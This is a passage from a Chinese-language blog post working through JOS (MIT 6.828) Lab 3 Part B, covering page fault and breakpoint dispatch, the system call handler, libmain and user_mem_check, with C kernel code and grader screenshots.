vector 14)?</p><p>因为 General Protection Fault 属于 0 特权级，用户态无权限触发，因此在访问其向量时会触发 Page Fault</p></li></ol></blockquote><p>接下来进入 Part B，继续完善我们的中断处理程序</p><h2 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h2><p>本节中我们将改进中断处理代码以实现一些需要通过异常处理实现的重要的原语</p><h3 id="Handling-Page-Faults"><a href="#Handling-Page-Faults" class="headerlink" title="Handling Page Faults"></a>Handling Page Faults</h3><p>缺页异常是一个十分重要的机制，出于性能的考虑，我们并不需要在一开始就为对应线性地址分配物理页，而可以在访问到他们时触发缺页异常后再分配物理页（例如 mmap 映射区域）</p><p>当触发缺页异常时，处理器会将造成缺页异常的线性地址存放在 cr2 寄存器中，JOS 提供了一个缺页异常处理函数 <code>page_fault_handler()</code>，在接下来的 Exercise 5 中我们需要修改 <code>trap_dispatch()</code> 以处理缺页异常</p><blockquote><p><strong>Exercise 5.</strong> Modify <code>trap_dispatch()</code> to dispatch page fault exceptions to <code>page_fault_handler()</code>. You should now be able to get make grade to succeed on the <code>faultread</code>, <code>faultreadkernel</code>, <code>faultwrite</code>, and <code>faultwritekernel</code> tests. If any of them don’t work, figure out why and fix them. Remember that you can boot JOS into a particular user program using make run-<em>x</em> or make run-<em>x</em>-nox. For instance, make run-hello-nox runs the <em>hello</em> user program.</p></blockquote><p>笔者直接用一个大的 switch 进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">trap_dispatch</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">switch</span>(tf-&gt;tf_trapno)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> T_DIVIDE:</span><br><span class="line"><span class="keyword">case</span> T_DEBUG:</span><br><span class="line"><span class="keyword">case</span> T_NMI:</span><br><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line"><span class="keyword">case</span> T_OFLOW:</span><br><span class="line"><span class="keyword">case</span> T_BOUND:</span><br><span class="line"><span class="keyword">case</span> T_ILLOP:</span><br><span class="line"><span class="keyword">case</span> T_DEVICE:</span><br><span class="line"><span class="keyword">case</span> T_DBLFLT:</span><br><span class="line"><span class="keyword">case</span> T_TSS:</span><br><span class="line"><span class="keyword">case</span> T_SEGNP:</span><br><span class="line"><span class="keyword">case</span> T_STACK:</span><br><span class="line"><span class="keyword">case</span> T_GPFLT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> T_PGFLT:</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">case</span> T_FPERR:</span><br><span class="line"><span class="keyword">case</span> T_ALIGN:</span><br><span class="line"><span class="keyword">case</span> T_MCHK:</span><br><span class="line"><span class="keyword">case</span> T_SIMDERR:</span><br><span class="line"><span class="keyword">case</span> T_SYSCALL:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行评分程序，成功通过缺页异常部分：</p><p><img src="https://s2.loli.net/2022/03/17/6CYuBxpQh5njEvP.png" alt="image.png"></p><h3 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h3><p>断点异常通常被用于调试程序，调试原理是将程序中对应指令替换为 int3 软中断；在 JOS 中我们将其转化为任何用户环境都可以唤醒一个 JOS kernel monitor 的一个“伪系统调用”</p><p>接下来是 Exercise 6，补完 <code>trap_dispatch()</code> 使得断点异常能唤起一个 kernel monitor</p><blockquote><p><strong>Exercise 6.</strong> Modify <code>trap_dispatch()</code> to make breakpoint exceptions invoke the kernel monitor. You should now be able to get make grade to succeed on the <code>breakpoint</code> test.</p></blockquote><p>简单修改一下之前的大 switch 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span> ;</span><br></pre></td></tr></table></figure><p>此时应该能通过 grade 中的断点评分</p><p><img src="https://s2.loli.net/2022/03/17/sJYUfEvIPtBrdFo.png" alt="image.png"></p><p>接下来又是 Challenge，完成单步调试器：</p><blockquote><p><em>Challenge!</em> Modify the JOS kernel monitor so that you can ‘continue’ execution from the current location (e.g., after the <code>int3</code>, if the kernel monitor was invoked via the breakpoint exception), and so that you can single-step one instruction at a time. You will need to understand certain bits of the <code>EFLAGS</code> register in order to implement single-stepping.</p><p><em>Optional:</em> If you’re feeling really adventurous, find some x86 disassembler source code - e.g., by ripping it out of QEMU, or out of GNU binutils, or just write it yourself - and extend the JOS kernel monitor to be able to disassemble and display instructions as you are stepping through them. Combined with the symbol table loading from lab 1, this is the stuff of which real kernel debuggers are made.</p></blockquote><p><del>闲出屁来才有时间去做这玩意，👴忙着呢</del></p><p>之后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><ol><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>这取决于 IDT 中门描述符的特权级，若特权级为 0 ，用户进程没有权限访问对应页面，自然会触发缺页异常；若特权级为3，则自然能正常通过门描述符触发断点异常。</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>目的是不允许用户随意通过门描述符进入不该进入的处理程序中</p></li></ol></blockquote><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>用户进程通过系统调用向内核请求资源，当用户进程进行系统调用时，处理器进入内核态，保存用户进程上下文，之后内核执行对应的系统调用代码，最后恢复回用户进程</p><p>在 JOS 中我们使用 <code>int 0x30</code> 来实现系统调用，进程通过对应的寄存器传递系统调用号（eax）与参数（edx，ecx，ebx，edi，esi），返回值存放在 rax 寄存器中</p><p>接下来是 Exercise 7，补完 JOS 的系统调用机制</p><blockquote><p><strong>Exercise 7.</strong> Add a handler in the kernel for interrupt vector <code>T_SYSCALL</code>. You will have to edit <code>kern/trapentry.S</code> and <code>kern/trap.c</code>‘s <code>trap_init()</code>. You also need to change <code>trap_dispatch()</code> to handle the system call interrupt by calling <code>syscall()</code> (defined in <code>kern/syscall.c</code>) with the appropriate arguments, and then arranging for the return value to be passed back to the user process in <code>%eax</code>. Finally, you need to implement <code>syscall()</code> in <code>kern/syscall.c</code>. Make sure <code>syscall()</code> returns <code>-E_INVAL</code> if the system call number is invalid. You should read and understand <code>lib/syscall.c</code> (especially the inline assembly routine) in order to confirm your understanding of the system call interface. Handle all the system calls listed in <code>inc/syscall.h</code> by invoking the corresponding kernel function for each call.</p><p>Run the <code>user/hello</code> program under your kernel (make run-hello). It should print “<code>hello, world</code>“ on the console and then cause a page fault in user mode. If this does not happen, it probably means your system call handler isn’t quite right. You should also now be able to get make grade to succeed on the <code>testbss</code> test.</p></blockquote><p>首先是在大 switch 里调用 JOS 的 syscall 接口，这里<strong>别忘了显式地将返回值给到 eax</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_SYSCALL:</span><br><span class="line">tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, </span><br><span class="line">tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx, </span><br><span class="line">tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, </span><br><span class="line">tf-&gt;tf_regs.reg_esi);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>之后修改 <code>kern/syscall.c</code> 中的 <code>syscall()</code> 函数，笔者本想选择声明一个系统调用表，在进行调用时直接查表调用即可，但是 JOS 已经写了一个 switch 在这里，那就一切从简吧（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatches to the correct kernel function, passing the arguments.</span></span><br><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">uint32_t</span> syscallno, <span class="type">uint32_t</span> a1, <span class="type">uint32_t</span> a2, <span class="type">uint32_t</span> a3, <span class="type">uint32_t</span> a4, <span class="type">uint32_t</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> SYS_cputs:</span><br><span class="line">sys_cputs((<span class="type">const</span> <span class="type">char</span>*)a1, a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_cgetc:</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> SYS_getenvid:</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> SYS_env_destroy:</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成之后应当能通过 grade 里的 testbss：</p><p><img src="https://s2.loli.net/2022/03/17/qseB1tyViWIrdDG.png" alt="image.png"></p><p>之后是 Challenge，修改代码使用 sysenter 与 sysexit 实现系统调用机制</p><blockquote><p><em>hallenge!</em> Implement system calls using the <code>sysenter</code> and <code>sysexit</code> instructions instead of using <code>int 0x30</code> and <code>iret</code>.</p><p>The <code>sysenter/sysexit</code> instructions were designed by Intel to be faster than <code>int/iret</code>. They do this by using registers instead of the stack and by making assumptions about how the segmentation registers are used. The exact details of these instructions can be found in Volume 2B of the Intel reference manuals.</p><p>The easiest way to add support for these instructions in JOS is to add a <code>sysenter_handler</code> in <code>kern/trapentry.S</code> that saves enough information about the user environment to return to it, sets up the kernel environment, pushes the arguments to <code>syscall()</code> and calls <code>syscall()</code> directly. Once <code>syscall()</code> returns, set everything up for and execute the <code>sysexit</code> instruction. You will also need to add code to <code>kern/init.c</code> to set up the necessary model specific registers (MSRs). Section 6.1.2 in Volume 2 of the AMD Architecture Programmer’s Manual and the reference on SYSENTER in Volume 2B of the Intel reference manuals give good descriptions of the relevant MSRs. You can find an implementation of <code>wrmsr</code> to add to <code>inc/x86.h</code> for writing to these MSRs <a href="http://ftp.kh.edu.tw/Linux/SuSE/people/garloff/linux/k6mod.c">here</a>.</p><p>Finally, <code>lib/syscall.c</code> must be changed to support making a system call with <code>sysenter</code>. Here is a possible register layout for the <code>sysenter</code> instruction:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eax                - syscall number</span><br><span class="line">edx, ecx, ebx, edi - arg1, arg2, arg3, arg4</span><br><span class="line">esi                - return pc</span><br><span class="line">ebp                - return esp</span><br><span class="line">esp                - trashed by sysenter</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GCC’s inline assembler will automatically save registers that you tell it to load values directly into. Don’t forget to either save (push) and restore (pop) other registers that you clobber, or tell the inline assembler that you’re clobbering them. The inline assembler doesn’t support saving <code>%ebp</code>, so you will need to add code to save and restore it yourself. The return address can be put into <code>%esi</code> by using an instruction like <code>leal after_sysenter_label, %%esi</code>.</p><p>Note that this only supports 4 arguments, so you will need to leave the old method of doing system calls around to support 5 argument system calls. Furthermore, because this fast path doesn’t update the current environment’s trap frame, it won’t be suitable for some of the system calls we add in later labs.</p><p>You may have to revisit your code once we enable asynchronous interrupts in the next lab. Specifically, you’ll need to enable interrupts when returning to the user process, which <code>sysexit</code> doesn’t do for you.</p></blockquote><p><del>没那闲工夫，👴选择摸了</del></p><h3 id="User-mode-startup"><a href="#User-mode-startup" class="headerlink" title="User-mode startup"></a>User-mode startup</h3><p>用户进程的入口点在 <code>lib/entry.S</code>，其在初始化后会调用 <code>libmain()</code>，接下来我们要修改该函数：将全局变量 <code>thisenv</code> 指向当前进程的 Env 结构体</p><p><code>libmain()</code> 之后会调用 <code>umain()</code>，定义于 <code>user/hello.c</code> 中，在打印 hello world 之后其会尝试访问 <code>thisenv-&gt;env_id</code>，在之前的实验中这会触发异常，接下来我们应当初始化 <code>thisenv</code> 以让他不触发异常</p><p>于是我们来到了 Exercise 8，<strong>进入到用户态的世界</strong>（其实系统调用那里已经在用户态与内核态“来去之间”了）</p><blockquote><p><strong>Exercise 8.</strong> Add the required code to the user library, then boot your kernel. You should see <code>user/hello</code> print “<code>hello, world</code>“ and then print “<code>i am environment 00001000</code>“. <code>user/hello</code> then attempts to “exit” by calling <code>sys_env_destroy()</code> (see <code>lib/libmain.c</code> and <code>lib/exit.c</code>). Since the kernel currently only supports one user environment, it should report that it has destroyed the only environment and then drop into the kernel monitor. You should be able to get make grade to succeed on the <code>hello</code> test.</p></blockquote><p>获取到进程 id 后遍历 envs 数组即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">libmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// set thisenv to point at our Env structure in envs[].</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">int</span> env_id;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"></span><br><span class="line">env_id = sys_getenvid();</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NENV; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (envs[i].env_id == env_id)</span><br><span class="line">&#123;</span><br><span class="line">thisenv = &amp;envs[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// thisenv = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// save the name of the program so that panic() can use it</span></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">0</span>)</span><br><span class="line">binaryname = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// call user main routine</span></span><br><span class="line">umain(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exit gracefully</span></span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时运行评分程序应当能通过 hello：</p><p><img src="https://s2.loli.net/2022/03/17/nUNeugYvxTH7p5b.png" alt="image.png"></p><h3 id="Page-faults-and-memory-protection"><a href="#Page-faults-and-memory-protection" class="headerlink" title="Page faults and memory protection"></a>Page faults and memory protection</h3><p>OS 通常依赖于硬件以保护内存，当一个程序尝试访问非法地址或无权限地址时处理器会停止进程运行，并带着造成异常的指令信息陷入内核，若该异常可以被修复则内核将其修复后再让程序继续运行，否则会终止程序运行</p><p>一个可以被修复的异常的范例便是栈的增长，在初始时我们仅为用户进程栈分配了一张页，当栈突破一张页的大小时便会触发缺页异常，此时内核应当自动分配一个新的内存页到该处，并让程序继续运行</p><p>系统调用同样可以在内存保护上造成问题：大部分的系统调用接口都会让用户程序向内核传递一个指针，而内核需要解引用这些指针，这便会有两个问题“</p><ul><li>内核空间中的缺页异常比用户空间中的缺页异常要严重得多，若内核在操纵自己的数据结构时出现缺页异常，那就是 kernel bug，应当引起 kernel panic，但若这些指针来自于用户进程，则应当要标识出这缺页异常是代表用户进程的</li><li>内核有着高于用户进程的权限，因此用户程序可能会传递一个指向用户不可读写但是内核可读写的区域，这也是内核需要注意的</li></ul><p>因此接下来我们要实现一个地址检查的功能，内核需要用其来检查用户程序传入的指针是否指向用户空间，以及页表是否允许相关操作</p><p>以此，内核永远不会因为解引用用户提供的指针而造成缺页异常，若内核发生了缺页异常，则应当 panic——这就是接下来的 Exercise 9，修改 <code>kern/trap.c</code> 让内核态下发生的缺页异常造成 kernel panic</p><blockquote><p><strong>Exercise 9.</strong> Change <code>kern/trap.c</code> to panic if a page fault happens in kernel mode.</p><p>Hint: to determine whether a fault happened in user mode or in kernel mode, check the low bits of the <code>tf_cs</code>.</p><p>Read <code>user_mem_assert</code> in <code>kern/pmap.c</code> and implement <code>user_mem_check</code> in that same file.</p><p>Change <code>kern/syscall.c</code> to sanity check arguments to system calls.</p><p>Boot your kernel, running <code>user/buggyhello</code>. The environment should be destroyed, and the kernel should <em>not</em> panic. You should see:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[00001000] user_mem_check assertion failure for va 00000001</span><br><span class="line">[00001000] free env 00001000</span><br><span class="line">Destroyed the only environment - nothing more to do!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Finally, change <code>debuginfo_eip</code> in <code>kern/kdebug.c</code> to call <code>user_mem_check</code> on <code>usd</code>, <code>stabs</code>, and <code>stabstr</code>. If you now run <code>user/breakpoint</code>, you should be able to run backtrace from the kernel monitor and see the backtrace traverse into <code>lib/libmain.c</code> before the kernel panics with a page fault. What causes this page fault? You don’t need to fix it, but you should understand why it happens.</p></blockquote><p>首先是修改缺页异常处理程序，若我们需要确定一个缺页异常发生在用户态还是内核态，只需要检查 Trapframe 中 cs 段寄存器的 RPL 位即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_fault_handler</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether it happened in kernel mode or not</span></span><br><span class="line"><span class="keyword">if</span> (!(tf-&gt;tf_cs &amp; <span class="number">0b11</span>))</span><br><span class="line">panic(<span class="string">&quot;kernel page fault!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="user-mem-check-：检查用户地址合法性"><a href="#user-mem-check-：检查用户地址合法性" class="headerlink" title="user_mem_check()：检查用户地址合法性"></a>user_mem_check()：检查用户地址合法性</h4><p>最后是修改 <code>user_mem_check()</code>，主要是以下两点：</p><ul><li>检查地址是否落在用户空间</li><li>检查页表项，用户是否有相应权限</li></ul><p>这里需要注意的是可能发生的整型溢出导致的地址回绕：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Check that an environment is allowed to access the range of memory</span></span><br><span class="line"><span class="comment">// [va, va+len) with permissions &#x27;perm | PTE_P&#x27;.</span></span><br><span class="line"><span class="comment">// Normally &#x27;perm&#x27; will contain PTE_U at least, but this is not required.</span></span><br><span class="line"><span class="comment">// &#x27;va&#x27; and &#x27;len&#x27; need not be page-aligned; you must test every page that</span></span><br><span class="line"><span class="comment">// contains any of that range.  You will test either &#x27;len/PGSIZE&#x27;,</span></span><br><span class="line"><span class="comment">// &#x27;len/PGSIZE + 1&#x27;, or &#x27;len/PGSIZE + 2&#x27; pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A user program can access a virtual address if (1) the address is below</span></span><br><span class="line"><span class="comment">// ULIM, and (2) the page table gives it permission.  These are exactly</span></span><br><span class="line"><span class="comment">// the tests you should implement here.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If there is an error, set the &#x27;user_mem_check_addr&#x27; variable to the first</span></span><br><span class="line"><span class="comment">// erroneous virtual address.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 if the user program can access this range of addresses,</span></span><br><span class="line"><span class="comment">// and -E_FAULT otherwise.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">user_mem_check</span><span class="params">(<span class="keyword">struct</span> Env *env, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">size_t</span> len, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> start, end;</span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">start = ((<span class="type">uint32_t</span>) va) &amp; (~(PGSIZE - <span class="number">1</span>));</span><br><span class="line">end = ROUNDUP(((<span class="type">uint32_t</span>) va) + len, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; start &lt; end; start += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line">pte = pgdir_walk(env-&gt;env_pgdir, (<span class="type">void</span>*)start, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((!pte) || (start &gt;= ULIM) || !(*pte &amp; PTE_P) || ((*pte &amp; perm) != perm))</span><br><span class="line">&#123;</span><br><span class="line">user_mem_check_addr =  (start &lt; (<span class="type">uint32_t</span>)va ? (<span class="type">uint32_t</span>)va : start);</span><br><span class="line"><span class="keyword">return</span> -E_FAULT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是修改 <code>debuginfo_eip()</code>，在 <code>usd</code>, <code>stabs</code>, <code>stabstr</code> 这三个地方加上 <code>user_mem_check()</code> 进行地址合法性检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure this memory is valid.</span></span><br><span class="line"><span class="comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)usd, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> UserStabData), PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">stabs = usd-&gt;stabs;</span><br><span class="line">stab_end = usd-&gt;stab_end;</span><br><span class="line">stabstr = usd-&gt;stabstr;</span><br><span class="line">stabstr_end = usd-&gt;stabstr_end;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure the STABS and string table memory is valid.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)stabs, stab_end - stabs, PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, (<span class="type">void</span>*)stabstr, stabstr_end - stabstr, PTE_U))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>最后是 Exercise 10，防止 evilhello 导致 kernel panic</p><blockquote><p><strong>Exercise 10.</strong> Boot your 